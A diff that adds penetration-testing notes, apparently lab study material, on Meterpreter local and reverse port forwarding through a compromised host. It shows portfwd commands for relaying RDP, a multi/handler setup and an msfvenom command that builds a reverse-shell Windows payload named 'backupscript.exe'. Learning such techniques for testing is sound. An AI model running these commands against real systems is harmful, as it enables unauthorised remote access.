@@ -132,3 +132,50 @@ meterpreter > run autoroute -s 172.16.5.0/23
 ```shell
 $ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
 ```
+
+
+## Meterpreter Port Forwarding
+
+### Creating Local TCP Relay
+The command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session.
+```shell
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+```
+
+### Netstat Output
+```shell
+$ netstat -antp
+
+tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
+```
+
+
+## Meterpreter Reverse Port Forwarding
+
+### Reverse Port Forwarding Rules
+This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081.
+```shell
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+
+### Configuring & Starting multi/handler
+```shell
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 8081 
+LPORT => 8081
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > run
+
+```
+
+### Generating the Windows Payload
+
+```shell
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+
+### run the script in the windows machine
